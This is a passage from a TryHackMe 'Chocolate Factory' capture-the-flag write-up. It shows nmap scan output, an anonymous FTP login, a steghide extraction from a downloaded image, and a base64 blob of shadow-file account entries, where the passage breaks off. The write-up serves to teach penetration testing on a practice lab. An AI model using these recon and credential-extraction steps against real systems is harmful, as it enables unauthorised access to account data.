SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port104-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port105-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port106-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port107-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port108-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/10%OT=21%CT=1%CU=42270%PV=Y%DS=2%DC=T%G=Y%TM=640AD51
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 22.034 days (since Thu Feb 16 07:09:34 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   258.95 ms 10.18.0.1
2   258.99 ms 10.10.250.54

NSE: Script Post-scanning.
Initiating NSE at 07:58
Completed NSE at 07:58, 0.00s elapsed
Initiating NSE at 07:58
Completed NSE at 07:58, 0.00s elapsed
Initiating NSE at 07:58
Completed NSE at 07:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1411.77 seconds
           Raw packets sent: 73645 (3.244MB) | Rcvd: 67713 (2.712MB)
```
There are 29 ports opened, but port 21, port 22 and port 80 are the major opened ports which we’d pay more attention to

Since the major ports opened are port 21, port 22 and port 80. We will start our enumeration from port 21.



<h2>Enumeration Port 21</h2>

Since Anonymous login is allowed for port 21, we can use default credentials to login into the ftp server.

```username:anonymous```     ```password:anonymous```

>command: ftp 10.10.250.54

```                                                                      
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ ftp 10.10.250.54
Connected to 10.10.250.54.
220 (vsFTPd 3.0.3)
Name (10.10.250.54:bl4ck4non): anonymous

331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
cool, we are logged in. Lets list the files in the directory, we find a ```gum_room.jpg``` file. What we will do now is get the image to our own machine.

>command: get gum_room.jpg

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ ftp 10.10.250.54
Connected to 10.10.250.54.
220 (vsFTPd 3.0.3)
Name (10.10.250.54:bl4ck4non): anonymous

331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||61521|)
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||35795|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |***********************************************************************************************************************************************************************************|   203 KiB   55.32 KiB/s    00:00 ETA
226 Transfer complete.
208838 bytes received in 00:03 (52.41 KiB/s)
ftp> 
```
Now that we’ve gotten the image to our machine, lets go ahead and check if there are hidden information in the image.

To do this we will use a tool called steghide.

>command to install steghide: apt-get install steghide

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ sudo apt-get install steghide                         
[sudo] password for bl4ck4non: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
steghide is already the newest version (0.5.1-15).
The following packages were automatically installed and are no longer required:
  libabsl20210324 libarmadillo10 libcamel-1.2-63 libcfitsio9 libcharls2 libgdal30 libgeocode-glib0 libgeos3.10.2 libgsoap-2.8.117 libmozjs-91-0 libpoppler118 libpoppler123 libpython3.10-dev librest-0.7-0
  python-mpltoolkits.basemap-data python3-iptools python3-pyproj python3-pyshp python3.10-dev
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 1177 not upgraded.
```
Now, that we have it installed lets go ahead and extract the information hidden in the image.

>command: steghide — extract -sf gum_room.jpg

When you are asked to input a passphrase just hit the enter key since we don’t have any passphrase.

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ steghide --extract -sf gum_room.jpg 
Enter passphrase: 
wrote extracted data to "b64.txt".
```
From the above screenshot you can see that there was a ```.txt``` file in the image. Lets go ahead and read the ```.txt``` file.

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ cat b64.txt  
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
